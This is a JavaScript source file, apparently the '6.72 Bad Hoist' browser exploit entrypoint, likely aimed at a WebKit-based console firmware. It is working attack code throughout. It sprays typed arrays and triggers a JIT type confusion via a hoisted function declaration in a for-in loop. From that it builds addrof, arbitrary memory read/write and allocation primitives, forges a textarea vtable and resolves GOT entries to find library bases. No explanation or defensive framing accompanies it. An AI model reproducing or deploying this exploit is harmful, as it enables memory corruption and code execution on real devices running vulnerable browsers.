// 6.72 Bad Hoist Entrypoint
var leaker_obj = { a: 0 };
var leaker_arr = new Uint32Array(6);
var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(7);
var malloc_nogc = [];
var spray = [];
var impl_idx = 0;

function spray_one() {
  var x = new Uint32Array(1);
  x[spray.length + 'spray'] = 123;
  spray.push(x);
}

for (var i = 0; i < 0x10000; i++)
  spray_one();

var target_672 = {
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  d: 5678
};

function create_impl() {
  var ans = {
    a: target_672
  };
  for (var i = 0; i < 32; i++)
    ans[(impl_idx++) + 'x'] = {};
  return ans;
}

function trigger(x) {
  var o = { a: 1 };
  for (var i in o) {
    {
      i = x;
      function i() {}
    }
    o[i];
  }
  if (impl.a != target_672) {
    target_672.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    var l1 = impl.a[4];
    var l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    var s1 = impl.a[4];
    var s2 = impl.a[5];
    target_672.c = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target_672.c = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target_672;
    return 1;
  }
  return 0;
}

var cntr;
for (cntr = 0; cntr < 1024; cntr++) {
  var impl = create_impl();
  var s = { a: impl };
  if (trigger(s))
    break;
}

if (cntr >= 1024)
  window.entrypoint672_result = 0;
else
  window.entrypoint672_result = 1;

function i48_put(x, a) {
  a[4] = x | 0;
  a[5] = (x / 4294967296) | 0;
}

function i48_get(a) {
  return a[4] + a[5] * 4294967296;
}

function addrof_672(x) {
  leaker_obj.a = x;
  return i48_get(leaker_arr);
}

function read_mem_setup(p, sz) {
  i48_put(p, oob_master);
  oob_master[6] = sz;
}

function read_mem(p, sz) {
  read_mem_setup(p, sz);
  var arr = [];
  for (var i = 0; i < sz; i++)
    arr.push(oob_slave[i]);
  return arr;
}

function write_mem(p, data) {
  i48_put(p, oob_master);
  oob_master[6] = data.length;
  for (var i = 0; i < data.length; i++)
    oob_slave[i] = data[i];
}

function read_ptr_at(p) {
  var ans = 0;
  var d = read_mem(p, 8);
  for (var i = 7; i >= 0; i--)
    ans = 256 * ans + d[i];
  return ans;
}

function write_ptr_at(p, d) {
  var arr = [];
  for (var i = 0; i < 8; i++) {
    arr.push(d & 0xff);
    d /= 256;
  }
  write_mem(p, arr);
}

function malloc_672(sz) {
  var arr = new Uint8Array(sz);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof_672(arr) + 0x10);
}

if (window.entrypoint672_result > 0) {
  var tarea = document.createElement('textarea');
  var real_vt_ptr = read_ptr_at(addrof_672(tarea) + 0x18);
  var fake_vt_ptr = malloc_672(0x400);
  write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
  var real_vtable = read_ptr_at(fake_vt_ptr);
  var fake_vtable = malloc_672(0x2000);
  write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
  write_ptr_at(fake_vt_ptr, fake_vtable);
  var fake_vt_ptr_bak = malloc_672(0x400);
  write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
  var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

  function get_got_addr(idx) {
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if (q[0] != 0xff || q[1] != 0x25)
      throw "Invalid GOT entry detected!";
    var offset = 0;
    for (var i = 5; i >= 2; i--)
      offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
  }

  var wkb = read_ptr_at(fake_vtable);
  var lkb = get_got_addr(705) - 0x10000;
  var lcb = get_got_addr(582);

  window.exploitsetup672_result = 1;
}